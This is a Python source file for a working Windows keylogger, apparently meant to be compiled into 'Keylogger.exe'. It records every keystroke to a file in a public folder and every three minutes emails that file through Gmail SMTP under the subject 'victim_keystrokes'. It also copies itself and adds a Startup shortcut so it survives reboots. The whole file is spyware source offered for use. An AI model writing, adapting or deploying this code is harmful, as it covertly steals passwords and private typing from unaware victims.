import pythoncom, pyHook
import threading
import time
import shutil
import os ,sys ,winshell
import smtplib
import tempfile
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import encoders
from win32com.client import Dispatch
import win32com.shell
from win32com.shell import shell
def my_function():
    gmail_user = '#your mailid'  
    gmail_password = '#your password'
    sent_from = gmail_user  
    to = ['#your mailid']  
    subject = 'victim_keystrokes'  
    body = 'its in attachment'
    msg = MIMEMultipart()
    msg.attach(MIMEText(body, 'plain'))
    filename = "keylogs.txt"
    attachment = open('C:\Users\Public\Libraries\keylogs.txt','r')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    email_text = msg.as_string()
    try:  
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
    except:  
        print 'f'
def keypressed(event):
    global store
    if event.Ascii==13:
        keys=' <ENT> ' 
    elif event.Ascii==8:
        keys=' <BSP> '
    else:
        keys=chr(event.Ascii)
    store = store + keys +'\n'
    fp=open("C:\Users\Public\Libraries\keylogs.txt","w+")
    fp.write(store)
    fp.close()
    return True

def printit():
    fp=open("C:\Users\Public\Libraries\keylogs.txt","a")
    threading.Timer(180.0, printit).start()
    my_function()
  
store = ''
printit()
source = "Keylogger.exe"
target = "C:\Users\Public\Libraries\Keylogger.exe"
os.system ("""copy "%s" "%s" """ % (source,target))
winshell.CreateShortcut (
Path=os.path.join (winshell.startup(), "Keylogger.lnk"),
Target=r"C:\Users\Public\Libraries\Keylogger.exe"
)

obj = pyHook.HookManager()
obj.KeyDown = keypressed

obj.HookKeyboard()        
pythoncom.PumpMessages()


#if you want to rename the exe then you must do here in the code  before you compile the program

